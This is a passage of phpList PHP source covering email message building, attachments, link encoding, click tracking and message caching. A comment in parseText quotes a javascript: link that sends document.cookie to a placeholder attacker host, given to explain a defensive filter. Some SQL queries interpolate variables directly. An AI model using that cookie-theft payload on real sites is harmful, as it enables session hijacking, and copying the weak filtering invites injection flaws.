        if (is_file($pdffile) && filesize($pdffile)) {
          $fp = fopen($pdffile,"r");
          if ($fp) {
            $contents = fread($fp,filesize($pdffile));
            fclose($fp);
            unlink($pdffile);
           $html = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
              <html>
              <head>
                <title></title>
              </head>
              <body>
              <embed src="message.pdf" width="450" height="450" href="message.pdf"></embed>
              </body>
              </html>';
 #           $mail->add_html($html,$textmessage);
             $mail->add_text($textmessage);
            $mail->add_attachment($contents,
              "message.pdf",
              "application/pdf");
          }
        }
        addAttachments($messageid,$mail,"HTML");
      } else {
        Sql_Query("update {$GLOBALS["tables"]["message"]} set astext = astext + 1 where id = $messageid");
        $mail->add_text($textmessage);
        addAttachments($messageid,$mail,"text");
      }
      break;
    case "text":
      # send as text
      foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
        $plugin->processSuccesFailure ($messageid, 'astext', $userdata);
      }
      Sql_Query("update {$GLOBALS["tables"]["message"]} set astext = astext + 1 where id = $messageid");
       $mail->add_text($textmessage);
      addAttachments($messageid,$mail,"text");
      break;
    case "both":
    case "text and HTML":
    case "HTML":
    default:
      $handled_by_plugin = 0;
      if (!empty($GLOBALS['pluginsendformats'][$cached[$messageid]["sendformat"]])) {
        # possibly handled by plugin
        $pl = $GLOBALS['plugins'][$GLOBALS['pluginsendformats'][$cached[$messageid]["sendformat"]]];
        if (is_object($pl) && method_exists($pl,'parseFinalMessage')) {
          $handled_by_plugin = $pl->parseFinalMessage($cached[$messageid]["sendformat"],$htmlmessage,$textmessage,$mail,$messageid);
        }
      }

      if (!$handled_by_plugin) {
        # send one big file to users who want html and text to everyone else
        if ($htmlpref) {
          Sql_Query("update {$GLOBALS["tables"]["message"]} set astextandhtml = astextandhtml + 1 where id = $messageid");
          foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
            $plugin->processSuccesFailure($messageid, 'ashtml', $userdata);
          }
        #  dbg("Adding HTML ".$cached[$messageid]["templateid"]);
          $mail->add_html($htmlmessage,$textmessage,$cached[$messageid]["templateid"]);
          addAttachments($messageid,$mail,"HTML");
        } else {
          Sql_Query("update {$GLOBALS["tables"]["message"]} set astext = astext + 1 where id = $messageid");
          foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
            $plugin->processSuccesFailure($messageid, 'astext', $userdata);
          }
          $mail->add_text($textmessage);
#          $mail->setText($textmessage);
#          $mail->Encoding = TEXTEMAIL_ENCODING;
          addAttachments($messageid,$mail,"text");
        }
      } 
      break;
  }
#  print htmlspecialchars($htmlmessage);exit;

  $mail->build_message(
      array(
        "html_charset" => $cached[$messageid]["html_charset"],
        "html_encoding" => HTMLEMAIL_ENCODING,
        "text_charset" => $cached[$messageid]["text_charset"],
        "text_encoding" => TEXTEMAIL_ENCODING)
      );


  if (!TEST) {
    if ($hash != 'forwarded' || !sizeof($forwardedby)) {
      $fromname = $cached[$messageid]["fromname"];
      $fromemail = $cached[$messageid]["fromemail"];
      $subject = $cached[$messageid]["subject"];
    } else {
      $fromname = '';
      $fromemail = $forwardedby['email'];
      $subject = $GLOBALS['strFwd'].': '.$cached[$messageid]["subject"];
    }
    
    if (!empty($cached[$messageid]["replytoemail"])) {
      $mail->AddReplyTo($cached[$messageid]["replytoemail"],$cached[$messageid]["replytoname"]);
    }
    if ($getspeedstats) output('build End '.$GLOBALS['processqueue_timer']->interval(1));
    if ($getspeedstats) output('send Start '.$GLOBALS['processqueue_timer']->interval(1));
    
    if (!empty($GLOBALS['developer_email'])) {
      $destinationemail = $GLOBALS['developer_email'];
    }
    
#    $mail->setSMTPParams('nogal');
    if (!$mail->send("", $destinationemail, $fromname, $fromemail, $subject)) {
#    if (!$mail->send(array($destinationemail),'spool')) {
      output("Error sending message $messageid to $email ($destinationemail)");
      logEvent("Error sending message $messageid to $email ($destinationemail)");
      return 0;
    } else {
      ## only save the estimated size of the message when sending a test message
      if ($getspeedstats) output('send End '.$GLOBALS['processqueue_timer']->interval(1));
      if (!isset($GLOBALS['send_process_id'])) {
        if (!empty($mail->mailsize)) {
          $name = $htmlpref ? 'htmlsize' : 'textsize';
          Sql_Replace($GLOBALS['tables']['messagedata'], array('id' => $messageid, 'name' => $name, 'data' => $mail->mailsize), array('name', 'id'));
        }
      }
      $sqlCount = $GLOBALS["pagestats"]["number_of_queries"] - $sqlCountStart;
      if ($getspeedstats) output('It took '.$sqlCount.'  queries to send this message');
#exit;
   #   logEvent("Sent message $messageid to $email ($destinationemail)");
      return 1;
    }
  }
  return 0;
}

function addAttachments($msgid,&$mail,$type) {
  global $attachment_repository,$website;
  if (ALLOW_ATTACHMENTS) {
    $req = Sql_Query("select * from {$GLOBALS["tables"]["message_attachment"]},{$GLOBALS["tables"]["attachment"]}
      where {$GLOBALS["tables"]["message_attachment"]}.attachmentid = {$GLOBALS["tables"]["attachment"]}.id and
      {$GLOBALS["tables"]["message_attachment"]}.messageid = $msgid");
    if (!Sql_Affected_Rows())
      return;
    if ($type == "text") {
      $mail->append_text($GLOBALS["strAttachmentIntro"]."\n");
    }

    while ($att = Sql_Fetch_array($req)) {
      switch ($type) {
        case "HTML":
          if (is_file($GLOBALS["attachment_repository"]."/".$att["filename"]) && filesize($GLOBALS["attachment_repository"]."/".$att["filename"])) {
            $fp = fopen($GLOBALS["attachment_repository"]."/".$att["filename"],"r");
            if ($fp) {
              $contents = fread($fp,filesize($GLOBALS["attachment_repository"]."/".$att["filename"]));
              fclose($fp);
              $mail->add_attachment($contents,
                basename($att["remotefile"]),
                $att["mimetype"]);
            }
          } elseif (is_file($att["remotefile"]) && filesize($att["remotefile"])) {
            # handle local filesystem attachments
            $fp = fopen($att["remotefile"],"r");
            if ($fp) {
              $contents = fread($fp,filesize($att["remotefile"]));
              fclose($fp);
              $mail->add_attachment($contents,
                basename($att["remotefile"]),
                $att["mimetype"]);
              list($name,$ext) = explode(".",basename($att["remotefile"]));
              # create a temporary file to make sure to use a unique file name to store with
              $newfile = tempnam($GLOBALS["attachment_repository"],$name);
              $newfile .= ".".$ext;
              $newfile = basename($newfile);
              $fd = fopen( $GLOBALS["attachment_repository"]."/".$newfile, "w" );
              fwrite( $fd, $contents );
              fclose( $fd );
              # check that it was successful
              if (filesize($GLOBALS["attachment_repository"]."/".$newfile)) {
                Sql_Query(sprintf('update %s set filename = "%s" where id = %d',
                  $GLOBALS["tables"]["attachment"],$newfile,$att["attachmentid"]));
              } else {
                # now this one could be sent many times, so send only once per run
                if (!isset($GLOBALS[$att["remotefile"]."_warned"])) {
                  logEvent("Unable to make a copy of attachment ".$att["remotefile"]." in repository");
                  $msg = "Error, when trying to send message $msgid the filesystem attachment
                    ".$att["remotefile"]." could not be copied to the repository. Check for permissions.";
                  sendMail(getConfig("report_address"),"Mail list error",$msg,"");
                  $GLOBALS[$att["remotefile"]."_warned"] = time();
                }
              }
            } else {
              logEvent("failed to open attachment ".$att["remotefile"]." to add to message $msgid ");
            }
          } else {
            logEvent("Attachment ".$att["remotefile"]." does not exist");
            $msg = "Error, when trying to send message $msgid the attachment
              ".$att["remotefile"]." could not be found";
            sendMail(getConfig("report_address"),"Mail list error",$msg,"");
          }
           break;

         case "text":
          $viewurl = $GLOBALS["scheme"]."://".$website.$GLOBALS["pageroot"].'/dl.php?id='.$att["id"];
          $mail->append_text($att["description"]."\n".$GLOBALS["strLocation"].": ".$viewurl."\n");
          break;
      }
    }
  }
}

function createPDF($text) {
  if (!isset($GLOBALS["pdf_font"])) {
    $GLOBALS["pdf_font"] = 'Arial';
    $GLOBALS["pdf_fontsize"] = 12;
   }
  $pdf=new FPDF();
  $pdf->SetCreator("PHPlist version ".VERSION);
  $pdf->Open();
  $pdf->AliasNbPages();
  $pdf->AddPage();
  $pdf->SetFont($GLOBALS["pdf_font"],$GLOBALS["pdf_fontstyle"],$GLOBALS["pdf_fontsize"]);
  $pdf->Write((int)$GLOBALS["pdf_fontsize"]/2,$text);
  $fname = tempnam($GLOBALS["tmpdir"],"pdf");
  $pdf->Output($fname,false);
  return $fname;
}

//function replaceChars() Moved to commonlib

function mailto2href($text) {
  # converts <mailto:blabla> link to <a href="blabla"> links
  #~Bas 0008857
  $text = preg_replace("/(.*@.*\..*) *<mailto:(\\1[^>]*)>/Umis","[URLTEXT]\\1[ENDURLTEXT][LINK]\\2[ENDLINK]\n",$text);
  $text = preg_replace("/<mailto:(.*@.*\..*)(\?.*)?>/Umis","[URLTEXT]\\1[ENDURLTEXT][LINK]\\1\\2[ENDLINK]\n",$text);
  $text = preg_replace("/\[URLTEXT\](.*)\[ENDURLTEXT\]\[LINK\](.*)\[ENDLINK\]/Umis",'<a href="mailto:\\2">\\1</a>',$text);
  return $text;
};

function linkencode($p_url){
  # URL Encode only the 'variable' parts of links, not the slashes in the path or the @ in an email address
  # from http://ar.php.net/manual/nl/function.rawurlencode.php
  # improved to handle mailto links properly
  #~Bas 0008857

  $uparts = @parse_url($p_url);

  $scheme = array_key_exists('scheme',$uparts) ? $uparts['scheme'] : "";
  $pass = array_key_exists('pass',$uparts) ? $uparts['pass']  : "";
  $user = array_key_exists('user',$uparts) ? $uparts['user']  : "";
  $port = array_key_exists('port',$uparts) ? $uparts['port']  : "";
  $host = array_key_exists('host',$uparts) ? $uparts['host']  : "";
  $path = array_key_exists('path',$uparts) ? $uparts['path']  : "";
  $query = array_key_exists('query',$uparts) ? $uparts['query']  : "";
  $fragment = array_key_exists('fragment',$uparts) ? $uparts['fragment']  : "";
  
  if(!empty($scheme))
   if($scheme == "mailto") {
     $scheme .= ':';
   } else {
     $scheme .= '://';
   };
   
  if(!empty($pass) && !empty($user)) {
   $user = rawurlencode($user).':';
   $pass = rawurlencode($pass).'@';
   } elseif(!empty($user))
     $user .= '@';
  
  if(!empty($port) && !empty($host))
     $host = ''.$host.':';
  elseif(!empty($host))
     $host=$host;
  
  if(!empty($path)){
    $arr = preg_split("/([\/;=@])/", $path, -1, PREG_SPLIT_DELIM_CAPTURE); // needs php > 4.0.5.
    $path = "";
    foreach($arr as $var){
      switch($var){
        case "/":
        case ";":
        case "=":
        case "@":
        $path .= $var;
          break;
        default:
          $path .= rawurlencode($var);
      }
    }
    // legacy patch for servers that need a literal /~username
    $path = str_replace("/%7E","/~",$path);
  }
  
  if(!empty($query)){
    $arr = preg_split("/([&=])/", $query, -1, PREG_SPLIT_DELIM_CAPTURE); // needs php > 4.0.5.
    $query = "?";
    foreach($arr as $var){
      if( "&" == $var || "=" == $var )
        $query .= $var;
      else
        $query .= rawurlencode($var);
    }    
  }
  
  if(!empty($fragment))
    $fragment = '#'.urlencode($fragment);
  
  return implode('', array($scheme, $user, $pass, $host, $port, $path, $query, $fragment));
}

function encodeLinks($text) {
  #~Bas Find and properly encode all links.
  preg_match_all("/<a(.*)href=[\"\'](.*)[\"\']([^>]*)>/Umis", $text, $links);
  
  foreach ($links[0] as $matchindex => $fullmatch) {
    $linkurl = $links[2][$matchindex];
    $linkreplace = '<a' . $links[1][$matchindex] . ' href="' . linkencode($linkurl) . '"' . $links[3][$matchindex] .'>';
    $text = str_replace($fullmatch,$linkreplace,$text);
  }
  return $text;
}

//function stripHTML() Moved to commonlib

function clickTrackLinkId($messageid,$userid,$url,$link) {
  global $cached;
  if (!isset($cached['linktrack']) || !is_array($cached['linktrack'])) $cached['linktrack'] = array();
  if (!isset($cached['linktracksent']) || !is_array($cached['linktracksent'])) $cached['linktracksent'] = array();
  if (!isset($cached['linktrack'][$link])) {
    $query
    = ' select id'
    . ' from ' . $GLOBALS['tables']['linktrack_forward']
    . ' where url = ?';
    $rs = Sql_Query_Params($query, array($url));
    $exists = Sql_Fetch_Row($rs);
    if (!$exists[0]) {
      $personalise = preg_match('/uid=/',$link);
      $query
      = ' insert into ' . $GLOBALS['tables']['linktrack_forward']
      . '    (url, personalise)'
      . ' values'
      . '    (?, ?)';
      Sql_Query_Params($query, array($url, $personalise));
      $fwdid = Sql_Insert_Id($GLOBALS['tables']['linktrack_forward'], 'id');
    } else {
      $fwdid = $exists[0];
    }
    $cached['linktrack'][$link] = $fwdid;
  } else {
    $fwdid = $cached['linktrack'][$link];
  }

  if (!isset($cached['linktracksent'][$messageid]) || !is_array($cached['linktracksent'][$messageid]))
    $cached['linktracksent'][$messageid] = array();
  if (!isset($cached['linktracksent'][$messageid][$fwdid])) {
    $query
    = ' select total'
    . ' from ' . $GLOBALS['tables']['linktrack_ml']
    . ' where messageid = ?'
    . '   and forwardid = ?';
    $rs = Sql_Query_Params($query, array($messageid, $fwdid));
    if (!Sql_Num_Rows($rs)) {
      $total = 1;
      ## first time for this link/message
      # BCD: Isn't this just an insert?
      Sql_Replace($GLOBALS['tables']['linktrack_ml'], array('total' => $total, 'messageid' => $messageid, 'forwardid' => $fwdid), array('messageid', 'forwardid'));
    } else {
      $tot = Sql_Fetch_Row($rs);
      $total = $tot[0] + 1;
      Sql_Query(sprintf('update %s set total = %d where messageid = %d and forwardid = %d', $GLOBALS['tables']['linktrack_ml'], $total, $messageid, $fwdid));
    }
    $cached['linktracksent'][$messageid][$fwdid] = $total;
  } else {
    $cached['linktracksent'][$messageid][$fwdid]++;
    ## write every so often, to make sure it's saved when interrupted
    if ($cached['linktracksent'][$messageid][$fwdid] % 100 == 0) {
      Sql_Query(sprintf('update %s set total = %d where messageid = %d and forwardid = %d',
        $GLOBALS['tables']['linktrack_ml'],$cached['linktracksent'][$messageid][$fwdid],$messageid,$fwdid));
    }
  }

/*  $req = Sql_Query(sprintf('insert ignore into %s (messageid,userid,forwardid)
    values(%d,%d,"%s","%s")',$GLOBALS['tables']['linktrack'],$messageid,$userdata['id'],$url,addslashes($link)));
  $req = Sql_Fetch_Row_Query(sprintf('select linkid from %s where messageid = %s and userid = %d and forwardid = %d
  ',$GLOBALS['tables']['linktrack'],$messageid,$userid,$fwdid));*/
  return $fwdid;
}
 
function parsePlaceHolders($content,$array = array()) {
  foreach ($array as $key => $val) {
    if (PHP5) {
      $key = str_replace('/','\/',$key);
      if (stripos($content,'['.$key.']') !== false) {
        $content = str_ireplace('['.$key.']',$val,$content);
      } elseif (preg_match('/\['.$key.'%%([^\]]+)\]/i',$content,$regs)) { ## @@todo, check for quoting */ etc
        if (!empty($val)) {
          $content = str_ireplace($regs[0],$val,$content);
        } else {
          $content = str_ireplace($regs[1],$regs[1],$content);
        }
      }
    } else { 
      $key = str_replace('/','\/',$key);
      if (preg_match('/\['.$key.'\]/i',$content,$match)) {
        $content = str_replace($match[0],$val,$content);
      }
    }
  }
  return $content;
}

function parseText($text) {
  # bug in PHP? get rid of newlines at the beginning of text
  $text = ltrim($text);

  # make urls and emails clickable
  $text = preg_replace("/([\._a-z0-9-]+@[\.a-z0-9-]+)/i",'<a href="mailto:\\1" class="email">\\1</a>',$text);
  $link_pattern="/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is";

  $i=0;
  while (preg_match($link_pattern, $text, $matches)){
    $url=$matches[2];
    $rest = $matches[3];
    if (!preg_match("/^(http:)|(mailto:)|(ftp:)|(https:)/i",$url)){
      # avoid this
      #<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
      $url = preg_replace("/:/","",$url);
    }
    $link[$i]= '<a href="'.$url.'" '.$rest.'>'.$matches[4].'</a>';
    $text = $matches[1]."%%$i%%".$matches[5];
    $i++;
  }

  $text = preg_replace("/(www\.[a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i", "http://\\1"  ,$text);#make www. -> http://www.
  $text = preg_replace("/(https?:\/\/)http?:\/\//i", "\\1"  ,$text);#take out duplicate schema
  $text = preg_replace("/(ftp:\/\/)http?:\/\//i", "\\1"  ,$text);#take out duplicate schema
  $text = preg_replace("/(https?:\/\/)(?!www)([a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i", "<a href=\"\\1\\2\" class=\"url\" target=\"_blank\">\\2</a>"  ,$text); #eg-- http://kernel.org -> <a href"http://kernel.org" target="_blank">http://kernel.org</a>

  $text = preg_replace("/(https?:\/\/)(www\.)([a-zA-Z0-9\.\/#~:?+=&%@!\\-_]+)/i", "<a href=\"\\1\\2\\3\" class=\"url\" target=\"_blank\">\\2\\3</a>"  ,$text); #eg -- http://www.google.com -> <a href"http://www.google.com" target="_blank">www.google.com</a>

  # take off a possible last full stop and move it outside
  $text = preg_replace("/<a href=\"(.*?)\.\" class=\"url\" target=\"_blank\">(.*)\.<\/a>/i","<a href=\"\\1\" class=\"url\" target=\"_blank\">\\2</a>."   ,$text);

  for ($j = 0;$j<$i;$j++) {
    $replacement = $link[$j];
    $text = preg_replace("/\%\%$j\%\%/",$replacement, $text);
  }

  # hmm, regular expression choke on some characters in the text
  # first replace all the brackets with placeholders.
  # we cannot use htmlspecialchars or addslashes, because some are needed

  $text = str_replace("\(","<!--LB-->",$text);
  $text = str_replace("\)","<!--RB-->",$text);
  $text = preg_replace('/\$/',"<!--DOLL-->",$text);

  # @@@ to be xhtml compabible we'd have to close the <p> as well
  # so for now, just make it two br/s, which will be done by replacing
  # \n with <br/>
#  $paragraph = '<p class="x">';
  $br = '<br />';
  $text = preg_replace("/\r/","",$text);
#  $text = ereg_replace("\n\n","\n".$paragraph,$text);
  $text = preg_replace("/\n/","$br\n",$text);

  # reverse our previous placeholders
  $text = str_replace("<!--LB-->","(",$text);
  $text = str_replace("<!--RB-->",")",$text);
  $text = str_replace("<!--DOLL-->","\$",$text);
  return $text;
}

function addHTMLFooter($message,$footer) {
  if (preg_match('#</body>#imUx',$message)) {
    $message = preg_replace('#</body>#',$footer.'</body>',$message);
  } else {
    $message .= $footer;
  }
  return $message;
}

/* preloadMessage
 * 
 * load message in memory cache $GLOBALS['cached']
 */

function precacheMessage($messageid,$forwardContent = 0) {
  global $cached;
  $domain = getConfig('domain');
   
#    $message = Sql_query("select * from {$GLOBALS["tables"]["message"]} where id = $messageid");
#    $cached[$messageid] = array();
#    $message = Sql_fetch_array($message);
  $message = loadMessageData($messageid);

  if (preg_match("/([^ ]+@[^ ]+)/",$message["replyto"],$regs)) {
    # if there is an email in the from, rewrite it as "name <email>"
    $message["replyto"] = str_replace($regs[0],"",$message["replyto"]);
    $cached[$messageid]["replytoemail"] = $regs[0];
    # if the email has < and > take them out here
    $cached[$messageid]["replytoemail"] = str_replace("<","",$cached[$messageid]["replytoemail"]);
    $cached[$messageid]["replytoemail"] = str_replace(">","",$cached[$messageid]["replytoemail"]);
    # make sure there are no quotes around the name
    $cached[$messageid]["replytoname"] = str_replace('"',"",ltrim(rtrim($message["replyto"])));
  } elseif (strpos($message["replyto"]," ")) {
    # if there is a space, we need to add the email
    $cached[$messageid]["replytoname"] = $message["replyto"];
    $cached[$messageid]["replytoemail"] = "listmaster@$domain";
  } else {
    if (!empty($message["replyto"])) {
      $cached[$messageid]["replytoemail"] = $message["replyto"] . "@$domain";

      ## makes more sense not to add the domain to the word, but the help says it does
      ## so let's keep it for now
      $cached[$messageid]["replytoname"] = $message["replyto"] . "@$domain";
    }
  }
  
  $cached[$messageid]["fromname"] = trim($cached[$messageid]["fromname"]);
  $cached[$messageid]["to"] = $message["tofield"];
  #0013076: different content when forwarding 'to a friend'
  $cached[$messageid]["subject"] = $forwardContent ? stripslashes($message["forwardsubject"]) : $message["subject"];
  #0013076: different content when forwarding 'to a friend'
  $cached[$messageid]["content"] = $forwardContent ? stripslashes($message["forwardmessage"]) : $message["message"];
  if (USE_MANUAL_TEXT_PART && !$forwardContent) {
    $cached[$messageid]["textcontent"] = $message["textmessage"];
  } else {
    $cached[$messageid]["textcontent"] = '';
  }
#  var_dump($cached);exit;
  #0013076: different content when forwarding 'to a friend'
  $cached[$messageid]["footer"] = $forwardContent ? stripslashes($message["forwardfooter"]) : $message["footer"];
  
  if (strip_tags($cached[$messageid]["footer"]) != $cached[$messageid]["footer"]) {
    $cached[$messageid]["textfooter"] = HTML2Text($cached[$messageid]["footer"]);
    $cached[$messageid]["htmlfooter"] = $cached[$messageid]["footer"];
  } else {
    $cached[$messageid]["textfooter"] = $cached[$messageid]["footer"];
    $cached[$messageid]["htmlfooter"] = parseText($cached[$messageid]["footer"]);
  }
  
  $cached[$messageid]["htmlformatted"] = strip_tags($cached[$messageid]["content"]) != $cached[$messageid]["content"];
  $cached[$messageid]["sendformat"] = $message["sendformat"];
  if ($message["template"]) {
    $req = Sql_Fetch_Row_Query("select template from {$GLOBALS["tables"]["template"]} where id = {$message["template"]}");
    $cached[$messageid]["template"] = stripslashes($req[0]);
    $cached[$messageid]["templateid"] = $message["template"];
 #   dbg("TEMPLATE: ".$req[0]);
  } else {
    $cached[$messageid]["template"] = '';
    $cached[$messageid]["templateid"] = 0;
  }

  ## @@ put this here, so it can become editable per email sent out at a later stage
  $cached[$messageid]["html_charset"] = 'UTF-8';#getConfig("html_charset");
  ## @@ need to check on validity of charset
  if (!$cached[$messageid]["html_charset"]) {
    $cached[$messageid]["html_charset"] = 'UTF-8';#'iso-8859-1';
  }
  $cached[$messageid]["text_charset"] =  'UTF-8';#getConfig("text_charset");
  if (!$cached[$messageid]["text_charset"]) {
    $cached[$messageid]["text_charset"] =  'UTF-8';#'iso-8859-1';
  }
    
  ## if we are sending a URL that contains user attributes, we cannot pre-parse the message here
  ## but that has quite some impact on speed. So check if that's the case and apply
  $cached[$messageid]['userspecific_url'] = preg_match('/\[.+\]/',$message['sendurl']);

  if (!$cached[$messageid]['userspecific_url']) {
    ## Fetch external content here, because URL does not contain placeholders
#      if ($GLOBALS["has_pear_http_request"] && !empty($message['sendurl'])) {
    if ($GLOBALS["has_pear_http_request"] && preg_match("/\[URL:([^\s]+)\]/i",$cached[$messageid]["content"],$regs)) {
      $remote_content = fetchUrl($regs[1],array());
    #  $remote_content = fetchUrl($message['sendurl'],array());

      # @@ don't use this
      #      $remote_content = includeStyles($remote_content);

      if ($remote_content) {
        $cached[$messageid]['content'] = str_replace($regs[0],$remote_content,$cached[$messageid]['content']);
      #  $cached[$messageid]['content'] = $remote_content;
        $cached[$messageid]["htmlformatted"] = strip_tags($remote_content) != $remote_content;
      } else {
        logEvent("Error fetching URL: ".$message['sendurl']. ' cannot proceed');
        return 0;
      }
    }
    
    if (VERBOSE && $GLOBALS['getspeedstats']) {
      output('fetch URL end');
    }
/*
print $message['sendurl'];
print $remote_content;exit;
*/
  } // end if not userspecific url

  
  if ($cached[$messageid]["htmlformatted"]) {
 #   $cached[$messageid]["content"] = compressContent($cached[$messageid]["content"]);
  }

  $cached[$messageid]['google_track'] = $message['google_track'];
/*
    else {
print $message['sendurl'];
exit;
}
*/

  if (VERBOSE && $GLOBALS['getspeedstats']) {
    output('parse config start');
  }
  if (is_array($GLOBALS["default_config"])) {
    foreach($GLOBALS["default_config"] as $key => $val) {
      if (is_array($val)) {
        $cached[$messageid]['content'] = str_replace("[$key]",getConfig($key),$cached[$messageid]['content']);
        $cached[$messageid]["textcontent"] = str_replace("[$key]",getConfig($key),$cached[$messageid]["textcontent"]);
      }
    }
  }
  if (VERBOSE && $GLOBALS['getspeedstats']) {
    output('parse config end');
  }
  if (preg_match("/##LISTOWNER=(.*)/",$cached[$messageid]['content'],$regs)) {
    $cached[$messageid]['listowner'] = $regs[1];
    $cached[$messageid]['content'] = str_replace($regs[0],"",$cached[$messageid]['content']);
  } else {
    $cached[$messageid]['listowner'] = 0;
  }

  $baseurl = $GLOBALS['website'];
  if (defined('UPLOADIMAGES_DIR') && UPLOADIMAGES_DIR) {
    $cached[$messageid]['content'] = preg_replace('/<img(.*)src="\/'.UPLOADIMAGES_DIR.'(.*)>/iU','<img\\1src="http://'.$baseurl.'/'.UPLOADIMAGES_DIR.'\\2>',$cached[$messageid]['content']);
  }
  if (defined('FCKIMAGES_DIR') && FCKIMAGES_DIR) {
    $cached[$messageid]['content'] = preg_replace('/<img(.*)src="\/lists\/'.FCKIMAGES_DIR.'(.*)>/iU','<img\\1src="http://'.$baseurl.'/lists/'.FCKIMAGES_DIR.'\\2>',$cached[$messageid]['content']);
  }
}  

# make sure the 0 template has the powered by image
$query
= ' select *'
. ' from %s'
. ' where filename = ?'
. '   and template = 0';
$query = sprintf($query, $GLOBALS['tables']['templateimage']);
$rs = Sql_Query_Params($query, array('powerphplist.png'));
if (!Sql_Num_Rows($rs)) {
  $query
  = ' insert into %s'
  . '   (template, mimetype, filename, data, width, height)'
  . ' values (0, ?, ?, ?, ?, ?)';
  $query = sprintf($query, $GLOBALS["tables"]["templateimage"]);
  Sql_Query_Params($query, array('image/png', 'powerphplist.png', $newpoweredimage, 70, 30));
}


?>


